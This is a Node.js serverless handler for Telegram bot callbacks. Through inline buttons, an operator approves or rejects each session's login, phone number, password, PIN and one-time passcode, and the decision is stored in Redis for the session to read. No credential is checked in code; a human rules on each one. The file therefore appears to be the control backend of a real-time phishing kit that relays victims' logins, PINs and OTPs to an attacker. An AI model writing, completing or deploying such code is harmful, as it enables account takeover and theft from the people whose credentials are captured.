const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));

// ── Bot credentials ──────────────────────────────────────────────────────────
const BOT1_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const BOT2_TOKEN = process.env.TELEGRAM_BOT_TOKEN_2;

// ── Redis helpers ─────────────────────────────────────────────────────────────
const REDIS_URL = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

async function redisSet(key, value, exSeconds = 600) {
    await fetch(`${REDIS_URL}/set/${key}/${encodeURIComponent(value)}/ex/${exSeconds}`, {
        headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
}

async function redisGet(key) {
    const res = await fetch(`${REDIS_URL}/get/${key}`, {
        headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    return json.result; // string | null
}

// ── Pick the right token based on stored botType ──────────────────────────────
function getToken(botType) {
    return botType === 'secondary' ? BOT2_TOKEN : BOT1_TOKEN;
}

// ── Telegram API helpers ──────────────────────────────────────────────────────
async function answerCallback(token, callbackQueryId, text) {
    await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false })
    });
}

async function editMessage(token, chatId, messageId, newText) {
    await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            message_id: messageId,
            text: newText,
            parse_mode: 'Markdown'
        })
    });
}

// ── Main handler ──────────────────────────────────────────────────────────────
exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') return { statusCode: 405, body: 'Method Not Allowed' };

    const body = JSON.parse(event.body || '{}');
    const cb = body.callback_query;
    if (!cb) return { statusCode: 200, body: 'ok' };

    const data = cb.data || '';
    const chatId = cb.message.chat.id;
    const msgId = cb.message.message_id;
    const cbId = cb.id;
    const origText = cb.message.text || '';

    // Extract sessionId from callback data (format: "action:sessionId")
    const sessionId = data.split(':')[1];

    // Look up which bot was assigned to this session
    const botType = (sessionId && await redisGet(`session:${sessionId}:botType`)) || 'primary';
    const token = getToken(botType);

    // ── Login decisions ──────────────────────────────────────────────────────
    if (data.startsWith('login_ok:')) {
        await redisSet(`session:${sessionId}:login`, 'approved');
        await answerCallback(token, cbId, '✅ Approved!');
        await editMessage(token, chatId, msgId, `✅ *Login Approved*\n\n${origText}`);
    }
    else if (data.startsWith('login_wrong_number:')) {
        await redisSet(`session:${sessionId}:login`, 'wrong_number');
        await answerCallback(token, cbId, '❌ Wrong Number');
        await editMessage(token, chatId, msgId, `❌ *Wrong Number*\n\n${origText}`);
    }
    else if (data.startsWith('login_wrong_password:')) {
        await redisSet(`session:${sessionId}:login`, 'wrong_password');
        await answerCallback(token, cbId, '❌ Wrong Password');
        await editMessage(token, chatId, msgId, `❌ *Wrong Password*\n\n${origText}`);
    }

    // ── PIN decisions ────────────────────────────────────────────────────────
    else if (data.startsWith('pin_ok:')) {
        await redisSet(`session:${sessionId}:pin`, 'approved');
        await answerCallback(token, cbId, '✅ PIN Correct!');
        await editMessage(token, chatId, msgId, `✅ *PIN Approved*\n\n${origText}`);
    }
    else if (data.startsWith('pin_wrong:')) {
        await redisSet(`session:${sessionId}:pin`, 'wrong_pin');
        await answerCallback(token, cbId, '❌ Wrong PIN');
        await editMessage(token, chatId, msgId, `❌ *Wrong PIN*\n\n${origText}`);
    }

    // ── OTP decisions ────────────────────────────────────────────────────────
    else if (data.startsWith('otp_ok:')) {
        await redisSet(`session:${sessionId}:otp`, 'approved');
        await answerCallback(token, cbId, '✅ OTP Correct!');
        await editMessage(token, chatId, msgId, `✅ *OTP Approved*\n\n${origText}`);
    }
    else if (data.startsWith('otp_wrong:')) {
        await redisSet(`session:${sessionId}:otp`, 'wrong_otp');
        await answerCallback(token, cbId, '❌ Wrong OTP');
        await editMessage(token, chatId, msgId, `❌ *Wrong OTP*\n\n${origText}`);
    }

    return { statusCode: 200, body: 'ok' };
};
